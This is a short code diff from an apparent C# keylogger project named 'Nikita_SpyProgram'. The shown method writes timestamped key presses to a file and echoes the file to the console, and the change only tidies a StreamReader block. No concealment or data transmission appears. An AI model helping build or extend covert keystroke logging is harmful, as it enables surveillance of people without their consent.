@@ -39,11 +39,9 @@ namespace Nikita_SpyProgram.Elements
                 sw.Write($" Время: {time} | Клавиша : {key}");
 
 
-            using (StreamReader sr = new StreamReader(path))
-            {
+            using (StreamReader sr = new StreamReader(path))           
                 Console.WriteLine(sr.ReadToEnd());
-                sr.Close();
-            }
+            
         }
     }
 }
